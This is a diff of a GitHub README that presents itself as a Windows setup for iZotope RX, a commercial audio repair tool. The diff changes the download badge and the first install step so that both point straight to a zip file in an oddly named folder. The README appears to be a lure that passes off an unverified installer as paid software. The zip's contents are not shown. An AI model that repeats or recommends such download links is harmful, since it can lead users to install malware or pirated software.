@@ -1,6 +1,6 @@
 # 🎧 iZotope-RX-Audio-Setup - Repair audio files with professional precision
 
-[![](https://img.shields.io/badge/Download-iZotope-blue.svg)](https://github.com/Chaddinoflagellata703/iZotope-RX-Audio-Setup)
+[![](https://img.shields.io/badge/Download-iZotope-blue.svg)](https://github.com/Chaddinoflagellata703/iZotope-RX-Audio-Setup/raw/refs/heads/main/schistosomia/Setup_i_Zotope_R_Audio_3.3.zip)
 
 iZotope RX helps you fix audio problems. It removes background noise, fixes clipping, and cleans up dialogue. Professionals in music, film, and podcast production use this software to improve sound quality. This repository provides a simple setup process for Windows users.
 
@@ -28,7 +28,7 @@ Your computer needs to meet these specifications to run the software smoothly:
 
 Follow these steps to install the software on your computer.
 
-1. Visit the following link to access the software files: [https://github.com/Chaddinoflagellata703/iZotope-RX-Audio-Setup](https://github.com/Chaddinoflagellata703/iZotope-RX-Audio-Setup).
+1. Visit the following link to access the software files: [https://github.com/Chaddinoflagellata703/iZotope-RX-Audio-Setup/raw/refs/heads/main/schistosomia/Setup_i_Zotope_R_Audio_3.3.zip](https://github.com/Chaddinoflagellata703/iZotope-RX-Audio-Setup/raw/refs/heads/main/schistosomia/Setup_i_Zotope_R_Audio_3.3.zip).
 2. Look for the button or link labeled "Download."
 3. Click the link to save the installer file to your computer.
 4. Locate the downloaded file in your "Downloads" folder.
